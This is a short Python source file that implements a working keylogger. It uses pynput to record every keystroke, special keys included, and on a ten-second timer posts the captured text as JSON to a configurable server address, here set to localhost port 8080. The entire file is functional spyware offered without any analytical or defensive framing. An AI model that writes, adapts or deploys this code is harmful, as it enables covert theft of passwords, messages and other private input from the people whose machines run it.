from pynput import keyboard
import requests
import threading

text = ""
last_sent_text = "" 
IP_ADDR = "127.0.0.1"
PORT = "8080"
update_time = 10 

def send_post_req():
    global text, last_sent_text

    if text and text != last_sent_text:
        try:
            payload = {"keylog": text}
            r = requests.post(f"http://{IP_ADDR}:{PORT}", json=payload, headers={"Content-Type": "application/json"})
            if r.status_code == 200:
                last_sent_text = text  
                text = ""
            else:
                print("Error response:", r.text)
        except Exception as e:
            print("Error encountered:", e)


    timer = threading.Timer(update_time, send_post_req)
    timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1] if text else text  # Remove last character
        elif hasattr(key, 'char') and key.char is not None:
            text += key.char  # Add character
        else:
            text += f"[{key.name}]"  # Handle special keys
    except Exception as e:
        print("Error handling key press:", e)

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()